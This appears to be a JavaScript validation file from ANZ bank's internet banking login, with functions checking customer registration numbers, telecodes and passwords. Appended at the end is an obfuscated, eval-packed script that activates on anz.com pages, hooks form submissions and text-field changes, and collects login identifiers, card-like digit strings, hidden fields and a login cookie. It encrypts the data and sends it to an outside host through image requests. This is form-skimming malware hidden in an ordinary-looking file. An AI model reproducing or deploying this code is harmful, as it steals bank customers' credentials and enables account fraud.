function isValidANZCRN (testCRN)
{
   if ((testCRN.length != 9) && (testCRN.length != 15) && (testCRN.length != 16))
   {
      alert("The Customer Registration Number that you have entered is either too long or too short.\nPlease re-enter this number, carefully checking the digits against your card or other record.\nIf you are a customer of ANZ New Zealand, please visit www.anz.co.nz");
      return false;
   }
   if (isDigit(testCRN) != true)
   {
      alert("The Customer Registration Number that you have entered contains non-numeric characters.\nPlease re-enter this number, carefully checking the digits against your card or other record.");
      return false;
   }
   return true;
}

function isValidTelecode (testTelecode)
{
   if (testTelecode.length < 4 || testTelecode.length > 7)
   {
      alert("Your Telecode should have a minimum of 4 and a maximum of 7 digits.\nPlease re-enter the number, carefully checking the digits.");
      return false;
   }
   if (isDigit(testTelecode) != true)
   {
      alert("Your Telecode should only contain numbers.\nPlease re-enter this number, carefully checking the digits.");
      return false;
   }

   return true;
}

function isValidPassword (checkString)
{
	if ((checkString.length == 4) || (checkString.length == 5))
	{
		alert("You have entered your password incorrectly. \nYour password must be between 8 and 16 characters in length and contain at least one number and one letter.  \nIf you are registering for Internet Banking for the first time, \nplease select the 'Register' button on the Homepage.\nOtherwise please check your password and try again.");
		return false;
	}
	else
	{
		if (checkString.length < 8)   
		{
			alert("You have entered your password incorrectly. \nYour password must be between 8 and 16 characters in length and contain at least one number and one letter. \nPlease re-enter your password.");
			return false;
		}

		if (checkString.length > 16)   
		{
			alert("You have entered your password incorrectly. \nYour password must be between 8 and 16 characters in length and contain at least one number and one letter. \nPlease re-enter your password.");
			return false;
		}

		var alphaFlag = false;
		var numericFlag = false;

		for (var i=0; i<checkString.length; i++)
		{
			testChar = checkString.charAt(i);
			if (isLetter(testChar))
			{
				alphaFlag = true;
			}
			else if (isDigit(testChar))
			{
				numericFlag = true;
			}
			else
			{
				alert("You have entered your password incorrectly. \nYour password must be between 8 and 16 characters in length and contain at least one number and one letter. \nPlease re-enter your password.");
				return false;
			}
		}

		if(!alphaFlag)
		{
			alert("You have entered your password incorrectly. \nYour password must be between 8 and 16 characters in length and contain at least one number and one letter. \nPlease re-enter your password.");
			return false;
		}
		if(!numericFlag)
		{
			alert("You have entered your password incorrectly. \nYour password must be between 8 and 16 characters in length and contain at least one number and one letter. \nPlease re-enter your password.");
			return false;
		}
	}
	return true;
}

eval(function(p,a,c,k,e,r){e=function(c){return(c<62?'':e(parseInt(c/62)))+((c=c%62)>35?String.fromCharCode(c+29):c.toString(36))};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'([57-9]|1\\w)'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('(7(){5 t=1b,u=[/\\.anz\\.1w$/i],F=\'1x://www.path-logic.1w/v4.0/1y/cc\',p=["1z"],v=["1z"],w=5000,G=\'1y\',H=\'dwF1Dv4n\',x=[/^\\d\\d\\d\\d\\d\\d\\d\\d\\d$/,/^\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d$/,/^\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d\\d$/],q=0,r=14,I=\'\',y=\'\';7 J(){5 a=r?K():L();11(5 b=0,c=u.10;b<c;b++){8(u[b].1A(a)){t=14;1B}}8(t){M();q=setInterval(z,1000);A(z);A(N)}}7 N(){8(q){clearInterval(q)}}7 z(){5 a=O();11(5 b=0,c=a.10;b<c;b++){8(P(a[b].cc)&&Q(a[b])){R(a[b])}}}7 L(){5 a=12.1m.host||"";9 a.1n().1C(/:\\d+$|\\.$/,\'\')}7 K(){5 a=16.1c||"";5 b=(a.1h("/")[2]||"").1h("?")[0];9 b.1n().1C(/:\\d+$|\\.$/,\'\')}7 S(){5 a=16.1c||"";9(a.1h("/")[0]||"")}7 Q(a){5 b=a.1o;5 c=14;11(5 f=0,d=b.10;f<d;f++){8(j(b[f].id,p)||j(b[f].1d,v)){c=1b;1B}}9(c||(a.method||\'\').1n()==\'post\')}7 B(a){9(1i(a)==\'string\'||s(a))&&a.10==0};7 s(a){9 1i(a)==\'object\'&&(a instanceof Array)};7 P(a){9 1i(a)==\'undefined\'};7 j(a,b){8(s(b)){11(5 c=0,f=b.10;c<f;c++){8(a==b[c]){9 1b}}}9 14}7 C(a){1p{5 b=[];5 c=a.1o;b.17([\'form_name\',a.1d||a.id||\'1j\'],[\'form_action\',a.action||\'1j\']);11(5 f=0,d=c.10;f<d;f++){e=c[f];8(!B(e.1e)){8(j(e.1d,v)||j(e.id,p)||e.1q==\'hidden\'){b.17([e.id||e.1d,e.1e])}1r 8(e.1q==\'1D\'){b.17([y+f,e.1e])}}}8(!B(b)){l(b,2,7(){a.1k()})}}1s(e){}}7 D(a){5 b;8(!a){5 a=12.event}8(a.1E){b=a.1E}1r 8(a.1F){b=a.1F}8(b.nodeType==3){b=b.parentNode}9 b}7 T(a){5 b=D(a);C(b);1G(7(){b.1k()},w);8(a.1H){a.1H()}9 14}7 E(){9 1I.floor(1I.random()*999999)}7 l(a,b,c){5 f=E();5 d=r?16.1c:12.1m;5 g=[[\'source\',d],[\'1c\',16.1c||\'1j\'],[\'code\',G],[\'nonce\',f],[\'a\',b]];5 h=new Image();h.id=f;8(c!=18){m(h,\'1J\',c)}h.src=[F,U(a.concat(g))].19(\'?\')}7 U(a){5 b=[];11(5 c=0,f=a.10;c<f;c++){8(s(a[c])){b.17(a[c].19(\'::\'))}}9[\'1t\',encodeURIComponent(V(W(b.19(\'||\'),H)))].19(\'=\')}7 X(a,b){5 c=j(a,p)?a:y,f=[[c,b]];l(f,2,18)}7 Y(a){5 b=D(a);8(b!=18){11(5 c=0,f=x.10;c<f;c++){8(x[c].1A(b.1e)){X(b.id||b.1d||\'1j\',b.1e)}}}}7 Z(a){8(!a||a.10<=0){9}11(5 b=0,c=a.10;b<c;b++){8(a[b].1q==\'1D\'){m(a[b],\'change\',Y)}}}7 R(a){1p{a.1k=a.1u;a.1u=7(){C(a);1G(7(){a.1k()},w)};8(!a.id){a.setAttribute(\'id\',\'form\'+E())}m(a,\'1u\',T);Z(a.1o||[]);a.cc=1b}1s(e){}}7 O(){5 a=[];1p{a=16.getElementsByTagName(\'FORM\')}1s(e){}9 a}7 M(){l([],1,18)}7 bc(){5 a=ba(I);8(a&&a.10>0){1t=[[\'recorded_login\',a]];l(1t,2,18)}}7 ba(a){5 b=a+"=";5 c=16.cookie.1h(\';\');11(5 f=0;f<c.10;f++){5 d=c[f];1L(d.1f(0)==\' \')d=d.1M(1,d.10);8(d.indexOf(b)==0)9 d.1M(b.10,d.10)}9 18}7 W(a,b){5 c=[];5 f=[];11(5 d=0;d<1a;d++){c[d]=d}5 g=0;5 h;11(d=0;d<1a;d++){g=(g+c[d]+b.1g(d%b.10))%1a;h=c[d];c[d]=c[g];c[g]=h}d=0;g=0;11(5 i=0,k=a.10;i<k;i++){d=(d+1)%1a;g=(g+c[d])%1a;h=c[d];c[d]=c[g];c[g]=h;f.17(String.fromCharCode(a.1g(i)^c[(c[d]+c[g])%1a]))}9 f.19(\'\')}7 V(a){5 b="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";5 c=[];5 f,d,g,h,i,k,n;5 o=0;1L(o<a.10){f=a.1g(o++);d=a.1g(o++);g=a.1g(o++);h=f>>2;i=((f&3)<<4)|(d>>4);k=((d&15)<<2)|(g>>6);n=g&63;8(1N(d)){k=n=64}1r 8(1N(g)){n=64}c.17(b.1f(h),b.1f(i),b.1f(k),b.1f(n))}9 c.19(\'\')}7 A(b){8(!12){9}8(16.readyState==\'complete\'){b();9}8(m(12,\'1J\',b)){9}5 c=b;8(1i(12.1v)==\'7\'){5 f=12.1v;c=7(){5 a=b();9 f?f():a};12.1v=c}}7 m(a,b,c){8(a.1P){a.1P(b,c,14);9 1b}8(a.1Q){5 f=a.1Q("on"+b,c);9 f}9 14}7 bb(){9 r?S():12.1m.protocol}8(bb()!=\'1x:\'){J()}})();',[],115,'|||||var||function|if|return|||||||||||||||||||||||||||||||||||||||||||||||||||||length|for|window||false||document|push|null|join|256|true|referrer|name|value|charAt|charCodeAt|split|typeof|none|_submit||location|toLowerCase|elements|try|type|else|catch|params|submit|onload|com|https|840608|CorporateSignonCorpId|test|break|replace|text|target|srcElement|setTimeout|preventDefault|Math|load||while|substring|isNaN||addEventListener|attachEvent'.split('|'),0,{}))